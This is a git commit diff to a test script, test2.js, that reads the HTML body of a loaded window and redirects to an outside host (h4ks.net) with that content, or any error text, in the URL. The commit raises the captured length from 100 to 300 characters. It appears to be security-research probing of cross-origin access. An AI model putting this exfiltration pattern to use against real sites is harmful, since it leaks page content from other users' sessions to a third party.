295caddd10b7abbdd3aa5b37b894eddbda9dc8e2
Robert Vulpe <nytr0gen.george@gmail.com>
2020-01-16 18:52:01 +0000

    Update test2.js

--- test2.js
+++ test2.js
@@ -3,7 +3,7 @@ try {
     x.onload = function () {
         try {
             var html = x.document.body.outerHTML;
-            location = '//h4ks.net/go/test?'+encodeURIComponent(html.slice(0, 100));
+            location = '//h4ks.net/go/test?'+encodeURIComponent(html.slice(0, 300));
         } catch (err) {
             location = '//h4ks.net/go/test?'+encodeURIComponent(err.toString());
         }
